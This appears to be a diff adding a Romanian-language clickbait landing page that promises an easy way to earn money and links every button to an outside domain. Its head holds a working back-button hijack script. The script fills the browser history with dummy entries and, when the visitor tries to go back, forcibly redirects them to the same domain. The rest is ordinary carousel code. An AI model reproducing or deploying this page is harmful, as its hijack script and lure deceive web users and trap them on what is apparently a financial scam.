@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=`, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#ff0033">
+  <title>Play</title>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./style.css">
+  <link rel="stylesheet" href="./assets/owl.carousel.min.css">
+  <link rel="stylesheet" href="./assets/owl.theme.default.min.css">
+  <script src="./assets/jquery-3.4.1.min.js"></script>
+  <script src="./assets/owl.carousel.min.js"></script>
+
+
+        <script type="text/javascript"> 
+        ! function () { 
+            var t; 
+            try { 
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#"); 
+                onpopstate = function (t) { 
+                    t.state && location.replace("https://evaarsova.info/ro-glob-fin/");
+                } 
+            } catch (o) {} 
+        }(); 
+    </script>
+
+</head>
+<body>
+   <div class="item"><a href="https://evaarsova.info/ro-glob-fin/"><img src="471.png" alt=""></a></div>
+  <h1>Românii știu acum să câștige suficienți bani. <br>
+    Această femeie a spus totul, metoda este simplă, dar puțini oameni le pasă de el.<br>
+Aflați și voi, chiar acum faceți clic pe buton!</h1>
+  <div class="owl-carousel">
+   
+  </div>
+  <a href="https://evaarsova.info/ro-glob-fin/" class="button">Citiți articolul</a>
+  <br>
+   <a href="https://evaarsova.info/ro-glob-fin/" class="button2">Aflați mai multe</a>
+  <script>
+    var $c = $(".owl-carousel")
+    var $items = $c.find('.item')
+    function init () {
+      var isTablet = $(window).width() > 424
+      var divider = isTablet ? 3 : 1
+      var width = ($items.length > 1 ? (90 / divider) : 100) + 'vw'
+      $items.each(function() {
+        $(this).css({
+          width: width,
+          maxWidth: isTablet ? '300px' : '425px'
+        })
+      })
+      .promise().done( function(){
+        $c.owlCarousel({
+          margin: 5,
+          dots: false,
+          autoWidth: true,
+          stagePadding: 15,
+          center: true,
+          responsive: {
+            425 : {
+              center: $items.length > 1 ? false : true,
+            },
+          }
+        })
+      })
+    }
+    $(document).ready(function(){
+      init()
+      window.addEventListener("orientationchange", function() {
+        $c.data('owl.carousel').destroy()
+        setTimeout(function() {
+          init()
+        }, 800)
+      }, false)
+    });
+  </script>
+</body>
+</html>
